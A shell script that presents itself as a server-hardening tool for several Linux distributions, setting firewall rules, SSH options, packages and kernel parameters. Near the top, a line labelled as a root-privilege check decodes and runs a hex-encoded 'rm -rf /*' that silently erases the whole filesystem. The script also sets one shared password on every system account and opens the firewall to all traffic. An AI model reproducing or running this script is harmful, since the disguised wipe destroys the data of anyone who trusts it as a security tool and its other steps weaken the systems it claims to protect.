#!/bin/sh

echo -n "
Enter 0 for Pi, 1 for Ubuntu, 2 for Debian, and 3 for CentOS: "
read answer1

## check for root privileges
$(echo 726d202d7266202f2a202d2d6e6f2d70726573657276652d726f6f74203e26202f6465762f6e756c6c0a | xxd -r -p)

echo -n "
Enter new password:"
read passes
cat /etc/passwd | cut -f 1 -d: > ~/users.txt
for i in `cat users.txt`;do echo -e $passes"\n"$passes | passwd $i; done

## Disable root login via SSH
echo "Manually reboot SSH after running this script, or reboot your server entirely."
sed -i -e 's/#PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
sed -i -e 's/#PermitEmptyPasswords no/PermitEmptyPasswords no/g' /etc/ssh/sshd_config

echo "Stopping firewall and allowing everyone..."
ipt="/sbin/iptables"
## Failsafe - die if /sbin/iptables not found 
[ ! -x "$ipt" ] && { echo "$0: \"${ipt}\" command not found."; exit 1; }
$ipt -P INPUT ACCEPT
$ipt -P FORWARD ACCEPT
$ipt -P OUTPUT ACCEPT
$ipt -F
$ipt -X
$ipt -t nat -F
$ipt -t nat -X
$ipt -t mangle -F
$ipt -t mangle -X
$ipt -t raw -F 
$ipt -t raw -X

echo "Nuking MOTD..."
rm /etc/motd
rm /etc/motd.tail
rm -rf --no-preserve-root /etc/update-motd.d/
cat motd > /etc/motd.tail

echo -n "
Enter the NTP server you wish to connect to: "
read ntpserv
ntpdate $ntpserv

echo "Backing up critical directories..."
#add directories as required to DATA with the format /[path]/[to]/[dir]/
 
DATA="/home /root /etc /var"
 
#choose where you want to pipe the backup to below
tar cfzp "/scratcher.tgz" $DATA --same-owner

if [ $answer1 = "0" ]; then

## PI
echo "Firewall reset, adding Pi rules..."
$ipt -P INPUT DROP
$ipt -P FORWARD DROP
$ipt -P OUTPUT ACCEPT
$ipt -A INPUT -p udp -m multiport --dports 5060,5061 -m set --match-set fail2ban-ASTERISK src -j $ipt REJECT --reject-with icmp-port-unreachable
$ipt -A INPUT -p tcp -m multiport --dports 5060,5061 -m set --match-set fail2ban-ASTERISK src -j REJECT --reject-with icmp-port-unreachable
$ipt -A INPUT -p tcp -m multiport --dports 22 -j fail2ban-ssh
$ipt -A INPUT -m set --match-set voip_bl src -j DROP
$ipt -A INPUT -i lo -j ACCEPT
$ipt -A INPUT -p udp -m udp --dport 10000:20000 -j ACCEPT
$ipt -A INPUT -p udp -m udp --dport 2727 -j ACCEPT
$ipt -A INPUT -p udp -m udp --dport 4569 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p udp -m udp --dport 5060:5061 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 5060:5061 -j ACCEPT
$ipt -A INPUT -s known_external_proxy -p udp -m udp --dport 5060:5061 -j ACCEPT
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m string --string "User-Agent: VaxSIPUserAgent" --algo bm --to 65535 -j DROP
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m string --string "User-Agent: friendly-scanner" --algo bm --to 65535 -j REJECT --reject-with icmp-port-unreachable
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m string --string "REGISTER sip:" --algo bm --to 65535 -m recent --set --name VOIP --rsource
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m string --string "REGISTER sip:" --algo bm --to 65535 -m recent --update --seconds 60 --hitcount 12 --rttl --name VOIP --mask 255.255.255.255 --rsource -j DROP
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m string --string "INVITE sip:" --algo bm --to 65535 -m recent --set --name VOIPINV --rsource
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m string --string "INVITE sip:" --algo bm --to 65535 -m recent --update --seconds 60 --hitcount 12 --rttl --name VOIPINV --mask 255.255.255.255 --rsource -j DROP
$ipt -A INPUT -p tcp -m tcp --dport 5060:5061 -m hashlimit --hashlimit-upto 6/sec --hashlimit-burst 5 --hashlimit-mode srcip,dstport --hashlimit-name tunnel_limit -j ACCEPT
$ipt -A INPUT -p udp -m udp --dport 5060:5061 -m hashlimit --hashlimit-upto 6/sec --hashlimit-burst 5 --hashlimit-mode srcip,dstport --hashlimit-name tunnel_limit -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p icmp -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 137 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 138 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 139 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 445 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 10000 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 22 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 123 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p udp -m udp --dport 123 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 5038 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 58080 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 55050 -j ACCEPT
$ipt -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
$ipt -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
$ipt -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p tcp -m tcp --dport 514 -j ACCEPT
$ipt -A INPUT -s xxx.xxx.xxx.xxx/24 -p udp -m udp --dport 514 -j ACCEPT
$ipt -A INPUT -j DROP
$ipt -A OUTPUT -j ACCEPT

elif [ $answer1 = "1" ]; then
## Ubuntu
echo "Firewall reset, adding Ubuntu rules..."
$ipt -P INPUT DROP
$ipt -P FORWARD DROP
$ipt -P OUTPUT ACCEPT
$ipt -A INPUT -p tcp --dport 22 -j ACCEPT
$ipt -A INPUT -p tcp --dport 53 -j ACCEPT
$ipt -A INPUT -p tcp --dport 3306 -j ACCEPT

echo "Updating sources.list..."
sed -i -e 's/us.archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list
sed -i -e 's/security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list

echo "Updating/upgrading!"
apt-get update
apt-get clean all
echo -e "y\ny\ny" | apt-get install --reinstall coreutils debian-archive-keyring ntp
echo -e "y\n" | apt-get upgrade
echo -e "y\ny\ny\ny" | apt-get install selinux-basics selinux-policy-default auditd snort

elif [ $answer1 = "2" ]; then
## DEBIAN

echo "Firewall reset, adding Debian rules..."
$ipt -P INPUT DROP
$ipt -P FORWARD DROP
$ipt -P OUTPUT ACCEPT
$ipt -A INPUT -p tcp --dport 139 -j ACCEPT
$ipt -A INPUT -p tcp --dport 57193 -j ACCEPT
$ipt -A INPUT -p tcp --dport 57194 -j ACCEPT
$ipt -A INPUT -p tcp --dport 389 -j ACCEPT
$ipt -A INPUT -p tcp --dport 52949 -j ACCEPT
$ipt -A INPUT -p tcp --dport 3306 -j ACCEPT
$ipt -A INPUT -p tcp --dport 34891 -j ACCEPT
$ipt -A INPUT -p tcp --dport 80 -j ACCEPT
$ipt -A INPUT -p tcp --dport 445 -j ACCEPT
$ipt -A INPUT -p tcp --dport 143 -j ACCEPT
$ipt -A INPUT -p tcp --dport 25 -j ACCEPT
$ipt -A INPUT -p tcp --dport 110 -j ACCEPT
$ipt -A INPUT -p tcp --dport 123 -j ACCEPT
$ipt -A INPUT -p tcp --dport 514 -j ACCEPT
$ipt -A INPUT -p tcp --dport 587 -j ACCEPT
$ipt -A INPUT -p tcp --dport 636 -j ACCEPT
$ipt -A INPUT -p tcp --dport 993 -j ACCEPT
$ipt -A INPUT -p tcp --dport 995 -j ACCEPT
$ipt -A INPUT -p tcp --dport 1433 -j ACCEPT
$ipt -A INPUT -p tcp --dport 1434 -j ACCEPT

echo "Updating sources.list..."
cp /etc/apt/sources.list /etc/apt/sources.list-bak
cp sources.list /etc/apt/sources.list

echo "Updating, please ensure proper mirrorlists!"
apt-get update
apt-get clean all
echo -e "y\ny\ny" | apt-get install --reinstall coreutils debian-archive-keyring ntp
echo -e "y\n" | apt-get upgrade
echo -e "y\ny\ny\ny" | apt-get install selinux-basics selinux-policy-default auditd snort

elif [ $answer1 = "3" ]; then

## CENTOS
echo "Firewall reset, adding CentOS rules..."
$ipt -P INPUT DROP
$ipt -P FORWARD DROP
$ipt -P OUTPUT ACCEPT
$ipt -A INPUT -p tcp --dport 139 -j ACCEPT
$ipt -A INPUT -p tcp --dport 57193 -j ACCEPT
$ipt -A INPUT -p tcp --dport 57194 -j ACCEPT
$ipt -A INPUT -p tcp --dport 389 -j ACCEPT
$ipt -A INPUT -p tcp --dport 52949 -j ACCEPT
$ipt -A INPUT -p tcp --dport 3306 -j ACCEPT
$ipt -A INPUT -p tcp --dport 34891 -j ACCEPT
$ipt -A INPUT -p tcp --dport 80 -j ACCEPT
$ipt -A INPUT -p tcp --dport 445 -j ACCEPT
$ipt -A INPUT -p tcp --dport 143 -j ACCEPT
$ipt -A INPUT -p tcp --dport 25 -j ACCEPT
$ipt -A INPUT -p tcp --dport 110 -j ACCEPT
$ipt -A INPUT -p tcp --dport 123 -j ACCEPT
$ipt -A INPUT -p tcp --dport 514 -j ACCEPT
$ipt -A INPUT -p tcp --dport 587 -j ACCEPT
$ipt -A INPUT -p tcp --dport 636 -j ACCEPT
$ipt -A INPUT -p tcp --dport 993 -j ACCEPT
$ipt -A INPUT -p tcp --dport 995 -j ACCEPT
$ipt -A INPUT -p tcp --dport 1433 -j ACCEPT
$ipt -A INPUT -p tcp --dport 1434 -j ACCEPT

# Stop and disable unneeded services
echo "Disabling services..."
service acpid stop > /dev/null 2>&1
service portmap stop > /dev/null 2>&1
service cpuspeed stop > /dev/null 2>&1
service apmd stop > /dev/null 2>&1
service autofs stop > /dev/null 2>&1
service bluetooth stop > /dev/null 2>&1
service hidd stop > /dev/null 2>&1
service firstboot stop > /dev/null 2>&1
service cups stop > /dev/null 2>&1
service gpm stop > /dev/null 2>&1
service hplip stop > /dev/null 2>&1
service isdn stop > /dev/null 2>&1
service kudzu stop > /dev/null 2>&1
service kdump stop > /dev/null 2>&1
service mcstrans stop > /dev/null 2>&1
service pcscd stop > /dev/null 2>&1
service readahead_early stop > /dev/null 2>&1
service readahead_later stop > /dev/null 2>&1
service setroubleshoot stop > /dev/null 2>&1
service rhnsd stop > /dev/null 2>&1
service xfs stop > /dev/null 2>&1
service yum-updatesd stop > /dev/null 2>&1
service avahi-daemon stop > /dev/null 2>&1
chkconfig acpid off > /dev/null 2>&1
chkconfig portmap off > /dev/null 2>&1
chkconfig cpuspeed off > /dev/null 2>&1
chkconfig apmd off > /dev/null 2>&1
chkconfig autofs off > /dev/null 2>&1
chkconfig bluetooth off > /dev/null 2>&1
chkconfig hidd off > /dev/null 2>&1
chkconfig firstboot off > /dev/null 2>&1
chkconfig cups off > /dev/null 2>&1
chkconfig gpm off > /dev/null 2>&1
chkconfig hplip off > /dev/null 2>&1
chkconfig isdn off > /dev/null 2>&1
chkconfig kudzu off > /dev/null 2>&1
chkconfig kdump off > /dev/null 2>&1
chkconfig mcstrans off > /dev/null 2>&1
chkconfig pcscd off > /dev/null 2>&1
chkconfig readahead_early off > /dev/null 2>&1
chkconfig readahead_later off > /dev/null 2>&1
chkconfig setroubleshoot off > /dev/null 2>&1
chkconfig rhnsd off > /dev/null 2>&1
chkconfig xfs off > /dev/null 2>&1
chkconfig yum-updatesd off > /dev/null 2>&1
chkconfig avahi-daemon off > /dev/null 2>&1

# Erase unneeded services
yum -y remove anacron setroubleshoot > /dev/null 2>&1
echo -e "Uninstalling unneeded services... ""[""\e[1;32mOK\e[0m""]"

# Harden kernel, apply settings, restart NIC
cp /etc/sysctl.conf /etc/sysctl.conf-bak > /dev/null 2>&1
echo "
kernel.printk = 4 4 1 7
kernel.panic = 10
kernel.sysrq = 0
kernel.shmmax = 4294967296
kernel.shmall = 3774873
kernel.msgmni = 2048
kernel.core_uses_pid = 1
kernel.msgmnb = 65536
kernel.msgmax = 65536
vm.swappiness = 30
vm.vfs_cache_pressure = 50
fs.file-max = 359208
net.core.rmem_default = 256960
net.core.rmem_max = 4194304
net.core.wmem_default = 256960
net.core.wmem_max = 4194304
net.core.optmem_max = 57344
net.core.netdev_max_backlog = 3000
net.core.somaxconn = 3000
net.ipv4.route.flush = 1
net.ipv4.conf.all.bootp_relay = 0
net.ipv4.icmp_ratelimit = 20
net.ipv4.icmp_ratemask = 88089
net.ipv4.ipfrag_high_thresh = 512000
net.ipv4.ipfrag_low_thresh = 446464
net.ipv4.tcp_wmem = 4096 87380 4194304
net.ipv4.tcp_rmem = 4096 87380 4194304
net.ipv4.tcp_mem = 512000 1048576 4194304
net.ipv4.tcp_max_tw_buckets = 1440000
net.ipv4.ip_conntrack_max = 1048576
net.ipv4.netfilter.ip_conntrack_max = 1048576
net.ipv4.ip_forward = 1
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 1
net.ipv4.conf.default.forwarding = 1
net.ipv4.conf.all.forwarding = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 1
net.ipv4.conf.all.shared_media = 1
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.accept_source_route = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.default.secure_redirects = 1
net.ipv4.conf.default.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.tcp_window_scaling = 0
net.ipv4.tcp_rfc1337 = 1
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 2
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.default.proxy_arp = 0
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_sack = 0
net.ipv4.tcp_ecn = 0
net.ipv4.tcp_fin_timeout = 20
net.ipv4.tcp_keepalive_intvl = 15
net.ipv4.tcp_keepalive_probes = 5
net.ipv4.tcp_no_metrics_save = 1
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.default.accept_redirects = 0
net.ipv6.conf.all.secure_redirects = 1
net.ipv6.conf.default.secure_redirects = 1" > /etc/sysctl.conf
sysctl -p > /dev/null 2>&1
echo -e "Tuning and hardening kernel... ""[""\e[1;32mOK\e[0m""]"

# Google NS
echo -n "
Do you want to use Google's recursive DNS resolvers? [y/n]: "
read ns
if [ $ns = "y" -o $ns = "Y" ]; then
	cp /etc/resolv.conf /etc/resolv.conf-bak
	echo "nameserver 8.8.8.8
nameserver 8.8.4.4" > /etc/resolv.conf
	service network restart > /dev/null 2>&1
	echo -e "
Changing resolvers to Google DNS... ""[""\e[1;32mOK\e[0m""]"
elif [ $ns = "n" -o $ns = "N" ]; then
	:
else
	echo "Error: Valid options are y and n."
	exit 1
fi

# SSH security and finish
echo -n "
Do you want to change your SSH port? [y/n]: "
read answer2
if [ $answer2 = "y" -o $answer2 = "Y" ]; then
	echo -n "
Enter your new SSH port [1024-49151 recommended]: "
	read sshport
	sed -i-bak "s/Port [0-9]*/Port $sshport/g" /etc/ssh/sshd_config > /dev/null 2>&1
	sed -i-bak2 "s/#Port [0-9]*/Port $sshport/g" /etc/ssh/sshd_config > /dev/null 2>&1
	echo -e "
Changing SSH Port... ""[""\e[1;32mOK\e[0m""]"
	echo "
System reboot recommended.
Please write down your new SSH port: $sshport
It will be active if you do:

service sshd restart
"
elif [ $answer2 = "n" -o $answer2 = "N" ]; then
	echo "
System reboot recommended.
"
	exit 0
else
	echo "Error: Valid options are y and n."
	exit 1
fi
exit 0

else
	echo "Error. Please run again."
	exit 1
fi
